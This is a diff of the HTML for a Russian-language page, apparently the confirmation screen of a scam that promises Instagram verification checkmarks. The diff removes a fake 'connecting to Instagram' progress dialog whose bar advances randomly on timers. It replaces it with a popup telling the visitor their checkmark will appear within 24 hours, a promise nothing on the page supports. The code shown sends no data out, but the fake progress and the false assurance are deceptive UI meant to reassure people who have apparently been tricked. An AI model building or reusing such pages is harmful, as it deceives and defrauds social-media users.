@@ -19,113 +19,21 @@
 	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
 
 	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.bundle.min.js" integrity="sha384-1CmrxMRARb6aLqgBO7yyAxTOQE2AKb9GfXnEo760AUcUmFx3ibVJJAzGytlQcNXd" crossorigin="anonymous"></script>
-  
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-127809453-3"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'UA-127809453-3');
-</script>
-
-	<script>
-    $('.message a').click(function(){
-   $('form').animate({height: "toggle", opacity: "toggle"}, "slow");
-});
-//downloading
-    $( function() {
-    var progressTimer,
-      progressbar = $( "#progressbar" ),
-      progressLabel = $( ".progress-label" ),
-      dialogButtons = [{
-        text: "Отменить",
-        click: closeDownload
-      }],
-      dialog = $( "#dialog" ).dialog({
-        autoOpen: false,
-        closeOnEscape: false,
-        resizable: false,
-        buttons: dialogButtons,
-        open: function() {
-          progressTimer = setTimeout( progress, 13000 );
-        },
-        beforeClose: function() {
-          downloadButton.button( "option", {
-            disabled: false,
-            label: "Start Download"
-          });
-        }
-      }),
-      downloadButton = $( "#downloadButton" )
-        .button()
-        .on( "click", function() {
-          $( this ).button( "option", {
-            disabled: true,
-            label: "Подождите..."
-          });
-          dialog.dialog( "open" );
-        });
- 
-    progressbar.progressbar({
-      value: false,
-      change: function() {
-        progressLabel.text( "Прогрес: " + progressbar.progressbar( "value" ) + "%" );
-      },
-      complete: function() {
-        progressLabel.text( "Успешно!" );
-        dialog.dialog( "option", "buttons", [{
-          text: "Готово",
-          click: closeDownload
-        }]);
-        $(".ui-dialog button").last().trigger( "focus" );
-      }
-    });
- 
-    function progress() {
-      var val = progressbar.progressbar( "value" ) || 0;
- 
-      progressbar.progressbar( "value", val + Math.floor( Math.random() * 3 ) );
- 
-      if ( val <= 99 ) {
-        progressTimer = setTimeout( progress, 700 );
-      }
-    }
- 
-    function closeDownload() {
-      clearTimeout( progressTimer );
-      dialog
-        .dialog( "option", "buttons", dialogButtons )
-        .dialog( "close" );
-      progressbar.progressbar( "value", false );
-      progressLabel
-        .text( "Соединение с Instagram" );
-      downloadButton.trigger( "focus" );
-    }
-  } );
-  </script>
-  <style>
-  #progressbar {
-    margin-top: 20px;
-  }
- 
-  .progress-label {
-    font-weight: bold;
-    text-shadow: 1px 1px 0 #fff;
-  }
- 
-  .ui-dialog-titlebar-close {
-    display: none;
-  }
-  </style>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
 <body>
-	<div class="login-page">
-  <div class="form">
-    <h2>Спасибо, галочка появится в течении 24 часов</h2>
- </div>
+  <div class="login-page">
+  
 </div>
+  <script>
+    swal({
+  title: "Успешно!",
+  text: "Твоя галочка должна появится в течении 24 часов!",
+  icon: "success",
+  button: "Хорошо",
+});
+  </script>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-127809453-5"></script>
 <script>
